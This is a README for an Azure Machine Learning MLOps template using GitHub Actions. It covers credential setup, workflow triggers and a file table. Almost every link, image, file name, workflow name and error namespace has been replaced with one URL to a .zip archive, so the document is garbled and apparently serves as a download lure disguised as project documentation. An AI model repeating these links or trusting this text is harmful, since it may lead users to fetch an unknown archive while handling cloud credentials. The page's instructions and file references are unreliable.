# ML Ops with GitHub Actions and AML

<p align="center">
  <img src="https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip" height="80"/>
  <img src="https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip" alt="plus" height="40"/>
  <img src="https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip" alt="Azure Machine Learning + Actions" height="80"/>
</p>

This template shows how to perform DevOps for Machine learning applications using [Azure Machine Learning](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) powered [GitHub Actions](). Using this template you will be able to setup your train and deployment infra, train the model and deploy them in an automated manner. 


# Getting started

### 1. Prerequisites

The following prerequisites are required to make this repository work:
- Azure subscription
- Contributor access to the Azure subscription
- Access to [GitHub Actions](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip)

If you don’t have an Azure subscription, create a free account before you begin. Try the [free or paid version of Azure Machine Learning](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) today.

### 2. Create repository

To get started with ML Ops, simply create a new repo based off this template, by clicking on the green "Use this template" button:

<p align="center">
  <img src="https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip" alt="GitHub Template repository" width="700"/>
</p>

### 3. Setting up the required secrets

#### To allow GitHub Actions to access Azure
An [Azure service principal](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) needs to be generated. Just go to the Azure Portal to find the details of your resource group. Then start the Cloud CLI or install the [Azure CLI](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) on your computer and execute the following command to generate the required credentials:

```sh
# Replace {service-principal-name}, {subscription-id} and {resource-group} with your 
# Azure subscription id and resource group name and any name for your service principle
az ad sp create-for-rbac --name {service-principal-name} \
                         --role contributor \
                         --scopes /subscriptions/{subscription-id}/resourceGroups/{resource-group} \
                         --sdk-auth
```

This will generate the following JSON output:

```sh
{
  "clientId": "<GUID>",
  "clientSecret": "<GUID>",
  "subscriptionId": "<GUID>",
  "tenantId": "<GUID>",
  (...)
}
```

Add this JSON output as [a secret](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) with the name `AZURE_CREDENTIALS` in your GitHub repository:

<p align="center">
  <img src="https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip" alt="GitHub Template repository" width="700"/>
</p>

To do so, click on the Settings tab in your repository, then click on Secrets and finally add the new secret with the name `AZURE_CREDENTIALS` to your repository.

Please follow [this link](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) for more details. 

#### To allow Azure to trigger a GitHub Workflow
 We also need GH PAT token with `repo` access so that we can trigger a GH workflow when the training is completed on Azure Machine Learning. 
 
 <p align="center">
  <img src="https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip" alt="GitHub Template repository" width="700"/>
</p>
 
 Add the PAT token with as [a secret](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) with the name `PATTOKEN` in your GitHub repository:
 <p align="center">
  <img src="https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip" alt="GitHub Template repository" width="700"/>
</p>

### 4. Setup and Define Triggers

#### Events that trigger workflow
Github workflows are triggered based on events specified inside workflows. These events can be from inside the github repo like a push commit or can be from outside like a webhook([repository-dispatch](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip)).
Refer [link](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) for more details on configuring your workflows to run on specific events.

#### Setup Trigger

We have precreated a GitHub workflow `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip` that does the infrastructure creation. To trigger this workflow follow the below steps-
- Update parameter 'resource_group' value in file [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) to your resource group name.
- Update environment variable 'RESOURCE_GROUP' in [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) workflow.   Make sure your resource group name in [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) is same as that in [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip). Committing this file will trigger this workflow and do the required setup.

Check the actions tab to view if your workflows have successfully run.

<p align="center">
  <img src="https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip" alt="GitHub Actions Tab" width="700"/>
</p>

#### Define Trigger
We have created sample workflow file [deploy_model](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) that gets triggered on repository dispatch event `machinelearningservices-runcompleted` as defined [here](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) . This workflow deploys trained model to azure kubernetes.

If you add this repository dispatch event `machinelearningservices-runcompleted` in other workflows, they will also start listening to the machine learning workspace events from  the subscribed workspace.



### 5. Testing the trigger

We have created sample workflow file [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) to train the model. You need to update this workflow file [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip)  by doing a commit to  this file or to any file under 'code/' folder.

This workflow trains the model and on successful training completion triggers  workflow [deploy_model](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) that deploys the model.

### 6. Review 

Any change to training file [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) will trigger workflow [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) and train the model using updated training code.
After this training completes [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip ) will automatically be triggered and deploy model to the AKS instance.

The log outputs of this workflow [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip ) run will provide URLs for you to get the service endpoints deployed on kubernetes. 


### 7. Next Steps: Add Storage Triggers

As next steps, you can setup similar triggers on updates to [Azure Storage](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) account. So, if you are using Azure Storage for storing your training data any update to the data will auto trigger the training on new data and will auto deploy the updated model too. 

You would need an Azure Storage account in the same resource group as above.  To create a new storage account use [link](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip). 

Follow there two steps to enable triggerring of GitHub Workflows on Storage Account updates. 
- Remove comments in [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) (  [line 562](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) and [line 600](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip)).
- Update `STORAGE_ACCOUNT` variable in [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) with the Storage Name you created above. 

A commit to https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip will enable [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) to be executed on any change in Storage Account. 



# Documentation

## Code structure

| File/folder                   | Description                                |
| ----------------------------- | ------------------------------------------ |
| `code`                        | Sample data science source code that will be submitted to Azure Machine Learning to train and deploy machine learning models. |
| `code/train`                  | Sample code that is required for training a model on Azure Machine Learning. |
| `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip`         | Training script that gets executed on a cluster on Azure Machine Learning. |
| `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip`  | Conda environment specification, which describes the dependencies of `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip`. These packages will be installed inside a Docker image on the Azure Machine Learning compute cluster, when executing your `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip`. |
| `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip`   | YAML files, which describes the execution of your training run on Azure Machine Learning. This file also references your `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip`. Please look at the comments in the file for more details. |
| `code/deploy`                 | Sample code that is required for deploying a model on Azure Machine Learning. |
| `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip`        | Inference script that is used to build a Docker image and that gets executed within the container when you send data to the deployed model on Azure Machine Learning. |
| `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip` | Conda environment specification, which describes the dependencies of `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip`. These packages will be installed inside the Docker image that will be used for deploying your model. |
| `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip`           | Test script that can be used for testing your deployed webservice. Add a `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip` to the `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip` folder and add the following code `{ "test_enabled": true }` to enable tests of your webservice. Change the code according to the tests that zou would like to execute. |
| `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip`               | Configuration files for the Azure Machine Learning GitHub Actions. Please visit the repositories of the respective actions and read the documentation for more details. |
| `.github/workflows`           | Folder for GitHub workflows. The `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip` sample workflow shows you how your can use the Azure Machine Learning GitHub Actions to automate the machine learning process. |
| `docs`                        | Resources for this README.                 |
| `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip`          | Microsoft Open Source Code of Conduct.     |
| `LICENSE`                     | The license for the sample.                |
| `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip`                   | This README file.                          |
| `https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip`                 | Microsoft Security README.                 |


## Documentation of Azure Machine Learning GitHub Actions

The template uses the open source Azure certified Actions listed below. Click on the links and read the README files for more details.
- [aml-workspace](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) - Connects to or creates a new workspace
- [aml-compute](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) - Connects to or creates a new compute target in Azure Machine Learning
- [aml-run](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) - Submits a ScriptRun, an Estimator or a Pipeline to Azure Machine Learning
- [aml-registermodel](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) - Registers a model to Azure Machine Learning
- [aml-deploy](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) - Deploys a model and creates an endpoint for the model


## Arm template to deploy azure resources
The workflow file 'https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip' deploys arm template to azure using standard azure CLI deploy command.
Arm Template [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) is used to deploy azure resources to azure . It uses the parameters provided in file [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip)  to create new resources or update the resources if they are already present.

### Documentation of template file parameters

| Parameter                  | Description                                |
| ----------------------------- | ------------------------------------------ |
| `workspaceName`                        | Specifies the name of the Azure Machine Learning https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip the resource doesn't exist a new workspace will be created, else existing resource will be updated using the arm template file |
| `baseName`                  | Name used as base-template to name the resources to be deployed in Azure. |
| `OwnerName`         | Owner of this deployment, person to contact for question. |
| `GitHubBranch`  | Name of the branch containing azure function code. |
| `eventGridTopicPrefix`   | The name of the Event Grid custom topic. |
| `eventGridSubscriptionName`                 | The prefix of the Event Grid custom topic's subscription. |
| `FunctionName`        |name of azure function used|
| `subscriptionID` | azure subscription ID being used for deployment |
| `GitHubURL`           | The URL of GitHub (ending by .git) containing azure function code. |
| `funcProjectFolder`               | The name of folder containing the function code. |
| `repo_name`           | The name of repository containing template https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip is picked up from github environment parameter 'GITHUB_REPOSITORY' |
| `pat_token`                        | pat token to be used by the function app to communicate to github via repository dispatch. |


## Event Grid Subscription
User can modify the https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip arm template to add/remove the storage events that he/she 
wants to subscribe to [here](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip). These are the available events from storage account :
```sh

https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip
https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip
https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip
https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip
https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip
https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip

```

## Known issues

### Error: MissingSubscriptionRegistration

Error message: 
```sh
Message: ***'error': ***'code': 'MissingSubscriptionRegistration', 'message': "The subscription is not registered to use namespace 'https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip'. See https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip for how to register subscriptions.", 'details': [***'code': 'MissingSubscriptionRegistration', 'target': 'https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip', 'message': "The subscription is not registered to use namespace 'https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip'. See https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip for how to register subscriptions
```
Solution:

This error message appears, in case the `Azure/aml-workspace` action tries to create a new Azure Machine Learning workspace in your resource group and you have never deployed a Key Vault in the subscription before. We recommend to create an Azure Machine Learning workspace manually in the Azure Portal. Follow the [steps on this website](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) to create a new workspace with the desired name. After ou have successfully completed the steps, you have to make sure, that your Service Principal has access to the resource group and that the details in your <a href="https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip">`https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip"` file</a> are correct and point to the right workspace and resource group.

# What is MLOps?

<p align="center">
  <img src="https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip" alt="Azure Machine Learning Lifecycle" width="700"/>
</p>

MLOps empowers data scientists and machine learning engineers to bring together their knowledge and skills to simplify the process of going from model development to release/deployment. ML Ops enables you to track, version, test, certify and reuse assets in every part of the machine learning lifecycle and provides orchestration services to streamline managing this lifecycle. This allows practitioners to automate the end to end machine Learning lifecycle to frequently update models, test new models, and continuously roll out new ML models alongside your other applications and services.

This repository enables Data Scientists to focus on the training and deployment code of their machine learning project (`code` folder of this repository). Once new code is checked into the `code` folder of the master branch of this repository the GitHub workflow is triggered and open source Azure Machine Learning actions are used to automatically manage the training through to deployment phases.

# Contributing

This project welcomes contributions and suggestions.  Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip

When you submit a pull request, a CLA bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.

This project has adopted the [Microsoft Open Source Code of Conduct](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip).
For more information see the [Code of Conduct FAQ](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) or
contact [https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip](https://raw.githubusercontent.com/satish-ss/mlops-enterprise-template/main/code/deploy/mlops-enterprise-template-v1.4.zip) with any additional questions or comments.
